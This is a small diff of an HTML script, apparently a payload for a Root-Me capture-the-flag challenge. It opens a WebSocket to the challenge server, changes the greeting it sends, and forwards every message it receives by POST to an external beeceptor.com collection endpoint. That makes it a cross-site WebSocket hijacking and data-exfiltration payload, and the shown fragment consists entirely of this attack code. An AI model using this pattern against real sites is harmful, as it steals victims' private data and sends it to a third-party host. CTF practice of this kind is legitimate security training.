@@ -2,7 +2,7 @@
 <script>
   var ws = new WebSocket('ws://ctf30.root-me.org/ws');
   ws.onopen = function() {
-    ws.send("READY");
+    ws.send("hello");
   };
   ws.onmessage = function(event) {
     fetch('https://rootme.free.beeceptor.com/', {method: 'POST', mode: 'cors', body: event.data});
